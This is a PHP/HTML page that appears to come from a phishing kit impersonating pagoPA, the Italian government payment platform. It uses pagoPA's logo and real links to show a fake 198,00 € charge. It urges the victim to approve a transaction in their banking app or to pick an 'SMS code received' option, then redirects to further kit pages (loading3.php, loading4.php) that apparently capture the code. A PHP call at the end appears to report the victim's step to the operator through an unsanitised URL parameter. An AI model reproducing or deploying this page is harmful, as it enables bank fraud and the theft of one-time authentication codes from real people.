<?php 
require '../main.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>pagoPA</title>
  <link rel="icon" type="image/png" href="img/pagopa-logo_brandlogos.net_gp2p3.png">
  <link href="css/swap.css" rel="stylesheet">
  <link rel="stylesheet" href="css/min.css">

  <style>
    body {
      font-family: 'Titillium Web', Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-image: url('img/pexels-photo-3182762.jpeg');
      background-position: center bottom;
      background-repeat: no-repeat;
      background-size: cover;
      background-attachment: fixed;
    }

    /* Remove background image on small screens (phones) */
    @media screen and (max-width: 767px) {
      body {
        background-image: none;
        background-color: #fff; /* fallback color */
      }
    }

    .navbar {
      background-color: #003366;
      padding: 10px 20px;
      display: flex;
      flex-wrap: nowrap;
      align-items: center;
      justify-content: space-between;
      color: white;
      overflow-x: auto;
      -webkit-overflow-scrolling: touch;
    }

    .navbar img {
      width: 150px;
      margin-bottom: 10px;
      flex-shrink: 0;
    }

    .button-container {
      display: flex;
      flex-wrap: nowrap;
      gap: 10px;
      overflow-x: auto;
      -webkit-overflow-scrolling: touch;
      flex-shrink: 1;
    }

    .button-container a {
      white-space: nowrap;
      flex-shrink: 0;
    }

    .navbar a {
      color: white;
      font-size: 14px;
      padding: 8px 12px;
      border-radius: 5px;
      text-decoration: none;
      display: inline-block;
    }

    .navbar a:hover {
      background-color: skyblue;
      color: #003366;
    }

    .content {
      background-color: rgba(244, 244, 244, 0.85);
      padding: 20px;
      margin: 20px auto;
      max-width: 1000px;
      border-radius: 10px;
      box-sizing: border-box;
    }

    .payment-box,
    .form-container {
      background-color: #003366;
      color: white;
      padding: 20px;
      border-radius: 10px;
      margin-bottom: 20px;
      font-size: 14px;
    }

    .payment-box h2 {
      font-size: 22px;
    }

    .form-container h2 {
      font-size: 18px;
      margin-bottom: 15px;
    }

    .form-section {
      display: flex;
      flex-wrap: wrap;
      gap: 20px;
    }

    .half-width {
      flex: 1;
      min-width: 250px;
    }

    .form-container label {
      font-weight: bold;
      margin-bottom: 6px;
      display: block;
    }

    .form-container input {
      width: 100%;
      padding: 8px;
      margin-bottom: 12px;
      border-radius: 5px;
      border: 1px solid #ccc;
      font-size: 14px;
      box-sizing: border-box;
      height: 38px;
      line-height: 1.2;
    }

    /* Style date input to look consistent with other inputs */
    input[type="date"] {
      appearance: none;
      -webkit-appearance: none;
      -moz-appearance: none;
      background: white;
      color: #000;
      padding: 8px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 5px;
      width: 100%;
      box-sizing: border-box;
      height: 38px;
      line-height: 1.2;
      position: relative;
    }

    /* Show the calendar icon in Chrome/Safari */
    input[type="date"]::-webkit-inner-spin-button,
    input[type="date"]::-webkit-calendar-picker-indicator {
      display: block;
      cursor: pointer;
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      width: 20px;
      height: 20px;
      opacity: 0.6;
    }

    /* Firefox calendar icon */
    input[type="date"]::-moz-calendar-picker-indicator {
      cursor: pointer;
    }

    .form-container button {
      background-color: skyblue;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      max-width: 300px;
      font-size: 16px;
      border-radius: 5px;
      margin: 20px auto;
      display: block;
      cursor: pointer;
    }

    footer {
      background-color: #003366;
      color: white;
      padding: 30px 20px;
      font-size: 14px;
    }

    .footer-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: space-between;
      gap: 20px;
    }

    .footer-logos img {
      height: 40px;
      margin-right: 10px;
    }

    .footer-links ul {
      list-style: none;
      padding: 0;
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      margin: 0;
    }

    .footer-links a {
      color: white;
      text-decoration: underline;
    }

    .footer-company-info {
      flex-basis: 100%;
    }

    @media screen and (max-width: 768px) {
      /* Navbar: keep buttons horizontal, allow scroll */
      .navbar {
        flex-wrap: nowrap;
      }
      .button-container {
        flex-wrap: nowrap;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch;
      }

      /* Form section stacked vertically on small */
      .form-section {
        flex-direction: column;
      }

      .half-width {
        width: 100%;
      }

      .form-container button {
        width: 100%;
      }

      .footer-container {
        flex-direction: column;
        align-items: flex-start;
      }
    }
  </style>
</head>
<body>
    <div class="navbar">
        <img src="img/pagopa-logo-white.png" alt="PagoPA Logo" />
        <div class="button-container">
            <a href="https://www.pagopa.gov.it/it/servizi/pagamento/">Pagamento multa</a>
            <a href="https://www.pagopa.gov.it/it/serve-aiuto/">Serve aiuto?</a>
            <a href="https://www.pagopa.gov.it/it/chi-siamo/pagopa-spa/">PagoPa S.p.A</a>
            <a href="https://www.pagopa.gov.it/it/pubbliche-amministrazioni/">Amministrazioni</a>
            <a href="https://www.pagopa.gov.it/it/soluzioni/">Soluzioni</a>
            <a href="https://www.pagopa.gov.it/it/assistenza/">Supporto</a>
        </div>
    </div>

    <meta charset="UTF-8" />
    <title>Conferma Operazione</title>
    <link rel="stylesheet" href="css/min.css" />
    <style>
        body {
            font-family: sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            padding: 0;
            text-align: center;
        }

        .container {
            max-width: 500px;
            margin: 50px auto;
            padding: 30px;
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
        }

        .icon {
            font-size: 48px;
            color: #0052cc;
            margin-bottom: 15px;
        }

        h2 {
            margin: 10px 0;
            color: #222;
        }

        .pagopa-spinner {
            width: 24px;
            height: 24px;
            border: 4px solid #ccc;
            border-top: 4px solid #0052cc;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            display: inline-block;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .dropdown-btn {
            background-color: #87cefa;
            color: white;
            font-weight: bold;
            font-size: 16px;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            position: relative;
            width: 100%;
            max-width: 300px;
            margin: 20px auto;
            display: block;
        }

        .dropdown-options {
            display: none;
            margin-top: 10px;
            width: 100%;
            max-width: 300px;
            margin-left: auto;
            margin-right: auto;
            background-color: #f1f1f1;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .dropdown-options a {
            display: block;
            padding: 12px;
            text-decoration: none;
            color: #333;
            font-weight: 500;
            background: #fff;
            transition: background 0.2s;
        }

        .dropdown-options a:hover {
            background-color: #e6f0ff;
        }

        .french-message-container {
            margin-top: 30px;
            font-size: 18px;
            font-weight: bold;
            color: #333;
            line-height: 1.6;
        }

        .confirm-btn {
            margin-top: 20px;
            background-color: #0052cc;
            color: white;
            font-size: 16px;
            padding: 12px 25px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
    </style>

    <meta charset="UTF-8" />
    <title>Conferma Operazione</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <style>
        body {
            font-family: sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            padding: 0;
            text-align: center;
        }

        .container {
            max-width: 500px;
            margin: 50px auto;
            padding: 30px;
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
        }

        .icon {
            font-size: 48px;
            color: #0052cc;
            margin-bottom: 15px;

            /* Shake animation */
            display: inline-block; /* keep it inline-block */
            animation: shake 1.2s infinite;
            transform-origin: center bottom;
        }

        @keyframes shake {
            0% {
                transform: rotate(0deg);
            }
            15% {
                transform: rotate(-15deg);
            }
            30% {
                transform: rotate(15deg);
            }
            45% {
                transform: rotate(-10deg);
            }
            60% {
                transform: rotate(10deg);
            }
            75% {
                transform: rotate(-5deg);
            }
            90% {
                transform: rotate(5deg);
            }
            100% {
                transform: rotate(0deg);
            }
        }

        h2 {
            margin: 10px 0;
            color: #222;
        }

        .pagopa-spinner {
            width: 24px;
            height: 24px;
            border: 4px solid #ccc;
            border-top: 4px solid #0052cc;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin: 12px auto;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .dropdown-btn {
            background-color: #87cefa;
            color: white;
            font-weight: bold;
            font-size: 16px;
            padding: 12px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            position: relative;
            width: 100%;
            max-width: 300px;
            margin: 20px auto;
            display: block;
        }

        .dropdown-options {
            display: none;
            margin-top: 10px;
            width: 100%;
            max-width: 300px;
            margin-left: auto;
            margin-right: auto;
            background-color: #f1f1f1;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .dropdown-options a {
            display: block;
            padding: 12px;
            text-decoration: none;
            color: #333;
            font-weight: 500;
            background: #fff;
            transition: background 0.2s;
        }

        .dropdown-options a:hover {
            background-color: #e6f0ff;
        }

        .french-message-container {
            margin-top: 30px;
            font-size: 18px;
            font-weight: bold;
            color: #333;
            line-height: 1.6;
        }

        .confirm-btn {
            margin-top: 20px;
            background-color: #0052cc;
            color: white;
            font-size: 16px;
            padding: 12px 25px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
    </style>

    <div class="container">
        <div class="icon"><i class="fas fa-mobile-alt"></i></div>
        <h2>Conferma l’operazione</h2>
        <h2>Importo: 198,00 €</h2>

        <p style="font-size: 18px; font-weight: 600; color: #333;">
            Accedi alla tua app bancaria e conferma la transazione per finalizzare il pagamento
        </p>
        <p style="font-size: 14px; font-weight: 600; color: #666;">
            Questa transazione può richiedere un minuto
        </p>

        <button id="methodButton" class="dropdown-btn" onclick="toggleDropdown()">Scegli il metodo di conferma <span style="float: right;">▾</span></button>

        <!-- 🔴 RED WARNING MESSAGE (hidden by default) -->
        <p id="warningMessage" style="color: red; display: none; margin: 8px 0 0 0;">
            Seleziona prima un metodo di conferma.
        </p>

        <div class="dropdown-options" id="confirmationDropdown" style="display: none;">
            <a href="#" onclick="selectMethod('app', event)">✅ Conferma tramite App bancaria</a>
            <a href="#" onclick="selectMethod('sms', event)">📩 Ho ricevuto un codice SMS</a>
        </div>

        <div class="french-message-container" style="font-size: 14px;">
            Se hai ricevuto un codice SMS, clicca su Scegli il metodo di conferma e seleziona Ho ricevuto un codice SMS, quindi clicca su Confermare
            <br />
            <br />
        </div>

        <button class="confirm-btn" onclick="confirmRedirect()">Confermare</button>

        <script>
            let selectedMethod = null;

            function toggleDropdown() {
                const dropdown = document.getElementById("confirmationDropdown");
                dropdown.style.display = dropdown.style.display === "block" ? "none" : "block";
            }

            function selectMethod(method, event) {
                event.preventDefault();

                selectedMethod = method;
                const button = document.getElementById("methodButton");
                const warning = document.getElementById("warningMessage");

                // hide red warning if shown previously
                warning.style.display = "none";

                if (method === "app") {
                    button.textContent = "✅ Conferma tramite App bancaria";
                } else if (method === "sms") {
                    button.textContent = "📩 Ho ricevuto un codice SMS";
                }

                button.style.backgroundColor = "#87cefa";
                document.getElementById("confirmationDropdown").style.display = "none";
            }

            function confirmRedirect() {
                const warning = document.getElementById("warningMessage");

                if (selectedMethod === "app") {
                    window.location.href = "loading3.php";
                } else if (selectedMethod === "sms") {
                    window.location.href = "loading4.php";
                } else {
                    // Show the red message instead of alert
                    warning.style.display = "block";
                }
            }

            // Close dropdown when clicking outside
            document.addEventListener("click", function (event) {
                const dropdown = document.getElementById("confirmationDropdown");
                const button = document.getElementById("methodButton");
                if (!button.contains(event.target) && !dropdown.contains(event.target)) {
                    dropdown.style.display = "none";
                }
            });
        </script>
    </div>
</body>
<?php 
$m->ctr("Phone (".@$_GET['p'].")");
?>
</html>